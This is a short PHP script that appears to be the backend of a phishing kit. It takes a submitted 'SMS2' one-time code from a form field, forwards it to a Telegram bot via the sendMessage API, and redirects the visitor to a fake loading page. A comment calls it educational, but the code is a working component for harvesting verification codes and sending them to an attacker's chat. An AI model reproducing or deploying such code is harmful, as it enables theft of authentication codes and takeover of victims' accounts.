<?php
include("sand_email.php"); 

// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Assuming you have a form field for email and password
    $sms2 = filter_input(INPUT_POST, 'smserror', FILTER_SANITIZE_EMAIL);


 

 

    // For educational purposes, here's how you might format a message
    $message = " ========= SMS2 Bouhmid============" . 
    "\nSMS2 : " . $sms2
    ; 


     $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
    
    // Use file_get_contents or cURL to send the message
     $response = file_get_contents($url); // Make sure allow_url_fopen is enabled in your php.ini
   
     HEADER("Location: ../loading2.php");


}



?>
